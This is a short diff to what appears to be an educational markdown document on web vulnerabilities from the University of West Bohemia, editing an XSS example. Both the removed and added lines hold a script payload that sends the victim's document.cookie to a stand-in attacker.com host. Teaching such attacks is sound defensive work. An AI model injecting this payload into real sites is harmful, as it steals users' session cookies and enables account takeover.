@@ -42,7 +42,7 @@ Created for University of West Bohemia.
 ```
 * or even worst
 ```html
-"><script>document.location= "http://www.attacker.com/cgi-bin/cookie.cgi?foo="+document.cookie</script>"
+<script>document.location= "http://www.attacker.com/cgi-bin/cookie.cgi?foo="+document.cookie</script>
 ```
 
 ### Broken Session Management
